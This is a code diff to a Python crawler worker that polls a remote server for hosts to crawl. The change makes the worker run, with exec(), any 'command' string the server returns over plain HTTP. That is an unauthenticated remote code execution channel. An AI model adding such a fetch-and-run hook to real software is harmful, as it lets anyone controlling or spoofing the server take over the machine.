@@ -43,13 +43,15 @@ class Cli(master_worker.MasterWorker):
             os.getpid(),
         )
         self.t = int(time.time())
+        self.proxy = None
 
     def get_command(self):
         url_task_ask = "http://u146.tyio.net:1033/host"
 
+        attrs = ["id", "proxy"]
         while True:
             try:
-                data = {"id": self.id}
+                data = {k: getattr(self, k, None) for k in attrs}
                 t = int(time.time())
                 if t > self.t:  # every second
                     self.t = t
@@ -57,7 +59,11 @@ class Cli(master_worker.MasterWorker):
                 data = json.dumps(data, default=str).encode()
                 task = self.session.get(url_task_ask, data=data)
                 if task.status_code == 200:
-                    return task.text
+                    resp = task.json()
+                    cmd = resp.get("command")
+                    if cmd:
+                        exec(cmd, None, {"_": self})
+                    return resp["host"]
                 else:
                     self.log("have a rest")
                     time.sleep(0.1)
@@ -67,12 +73,12 @@ class Cli(master_worker.MasterWorker):
                 time.sleep(0.1)
 
     def work(self, host):
-        out = robot2.run(host=host, n_pages=10)
+        out = robot2.run(host=host, n_pages=10, proxy=self.proxy)
         data = json.dumps(out, separators=(",", ":"), ensure_ascii=False).encode()
         return data
 
     def process_result(self, host, data):
-        url = "http://u146.tyio.net:1033/host-info/{}".format(host)
+        url = "http://u146.tyio.net:1033/host-info/{}?id={}".format(host, self.id)
         self.session.post(url, data=data)
 
     def cmd__reload(self):
